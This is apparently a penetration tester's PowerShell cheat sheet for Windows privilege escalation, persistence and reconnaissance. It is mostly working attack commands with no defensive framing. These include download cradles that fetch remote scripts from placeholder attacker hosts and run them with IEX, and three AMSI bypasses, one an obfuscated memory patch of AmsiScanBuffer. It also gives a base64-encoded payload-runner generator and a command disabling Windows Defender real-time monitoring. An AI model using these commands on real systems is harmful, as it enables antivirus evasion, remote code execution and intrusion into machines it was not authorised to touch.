# powershell

#plateform/windows #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 

## Download cradle
```powershell
(new-object system.net.webclient).downloadstring('http://<ip>/<script>') | IEX
```

## Get file in trash
```powershell
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
```

## Get process
```powershell
Get-Process
```

## Get Proxy
```powershell
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://<ip>/<url>")
```

## Get language mode
```powershell
$ExecutionContext.SessionState.LanguageMode
```

## Bypass AMSI with _amsiContext_ (powershell only)
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

## Bypass AMSI with _AmsiInitFailed_ (powershell only)
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true)
```

## Bypass AMSI by patching (work for .NET binaries too)

more infos here : https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/

```powershell
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

## Verify PPL
```powershell
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```

## Verify application whitelisting
```powershell
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

## show forest trust
```powershell
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
```

## Get domain trust
```powershell
Get-DomainTrust -Domain <domain>
```

## Get domain SID
```powershell
Get-DomainSID -domain <sid>
```

## hostrecon
https://github.com/dafthack/HostRecon

```
(new-object system.net.webclient).downloadstring('http://<lhost>/HostRecon.ps1') | IEX; Invoke-HostRecon
```

## privesccheck
https://github.com/itm4n/PrivescCheck

```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/PrivescCheck.ps1') | IEX; Invoke-PrivescCheck
```

## powershell view assemblies
```powershell
[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname
```

## powershell get proxy address
```powershell
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
```

## powershell set proxy
```powershell
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://<proxaddress|$proxyAddr>")
```

## powershell - generate base64 encoded payload download runner
#plateform/linux #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 

```powershell
pwsh -Command '$text = "(New-Object System.Net.WebClient).DownloadString(''http://<lhost>/<file>'') | IEX";$bytes = [System.Text.Encoding]::Unicode.GetBytes($text);$EncodedText = [Convert]::ToBase64String($bytes);$EncodedText'
```

## powershell - disable Real Time Monitoring (Windows Defender)
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```